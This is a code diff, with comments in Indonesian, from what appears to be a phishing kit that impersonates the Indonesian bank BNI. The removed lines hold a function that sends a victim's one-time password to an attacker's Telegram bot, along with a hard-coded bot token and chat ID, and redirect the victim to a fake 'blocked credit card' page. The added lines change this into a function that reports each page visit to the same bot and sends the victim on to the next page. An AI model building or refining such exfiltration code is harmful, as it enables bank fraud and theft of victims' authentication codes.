@@ -1,29 +1,24 @@
 // =========================================================
-// 🤖 KONFIGURASI & FUNGSI BOT TELEGRAM
+// 🤖 FUNGSI BOT TELEGRAM
 // =========================================================
-
-// ⚠️ TOKEN & ID DISINI — TIDAK TERCAMPUR HTML
-const TELEGRAM_CONFIG = {
-  BOT_TOKEN: "8074762578:AAFze7gDSC6mN4ygqKs-Mx71WprCU8-z_04",
-  CHAT_ID: "7402071395",
-  REDIRECT_URL: "/Blokir/Kartu/Kredit/terblokir.html"
-};
+const { BOT_TOKEN, CHAT_ID, NEXT_URL } = TELEGRAM_CONFIG;
 
 // =========================================================
 // 📤 KIRIM PESAN KE TELEGRAM
 // =========================================================
 async function kirimPesanTelegram(pesan) {
   try {
-    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+        chat_id: CHAT_ID,
         text: pesan,
         parse_mode: "Markdown"
       })
     });
-    return res.ok;
+    const data = await res.json();
+    return data.ok === true;
   } catch (err) {
     console.error("❌ Telegram Error:", err);
     return false;
@@ -31,22 +26,22 @@ async function kirimPesanTelegram(pesan) {
 }
 
 // =========================================================
-// 🔁 PINDAH HALAMAN
+// 📝 NOTIFIKASI HALAMAN DIBUKA
 // =========================================================
-function pindahHalaman() {
-  window.location.href = TELEGRAM_CONFIG.REDIRECT_URL;
-}
-
-// =========================================================
-// 📤 KIRIM DATA OTP
-// =========================================================
-async function kirimDataOTP(otp) {
+function notifikasiHalamanDibuka(namaHalaman) {
   const pesan = `
-🔔 SANGGAHAN BNI
+🌐 HALAMAN DIBUKA
 ━━━━━━━━━━━━━━━━━━━━
-🔑 OTP: ${otp}
+📄 Halaman: ${namaHalaman}
 🕐 Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
 ━━━━━━━━━━━━━━━━━━━━
   `.trim();
-  return await kirimPesanTelegram(pesan);
+  kirimPesanTelegram(pesan);
+}
+
+// =========================================================
+// 🔀 PINDAH HALAMAN BERIKUTNYA
+// =========================================================
+function lanjutKeHalamanBerikutnya() {
+  window.location.href = NEXT_URL;
 }
